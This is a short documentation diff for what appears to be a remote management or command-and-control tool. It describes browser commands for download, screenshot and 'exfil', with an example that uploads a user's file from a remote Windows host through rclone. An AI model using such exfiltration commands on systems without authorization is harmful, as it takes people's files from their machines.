@@ -35,7 +35,7 @@ These commands are handled in the browser (same as `rmm_cli.py`) and POST to the
 | Command | API | Notes |
 |---------|-----|-------|
 | `download <remote_path>` | `POST …/download` | Spaces in path: quote or omit extra tokens are joined |
-| `exfil <remote_path> [profile]` | `POST …/exfil` | Profile defaults to Exfil panel selection / server default |
+| `exfil <remote_path> [profile]` | `POST …/exfil` | File or folder; profile defaults to Exfil panel / server default |
 | `screenshot` | `POST …/screenshot` | No arguments |
 
 Example: `exfil C:\Users\…\file.iso mega-lab` queues rclone upload; it is not passed to `cmd.exe`.
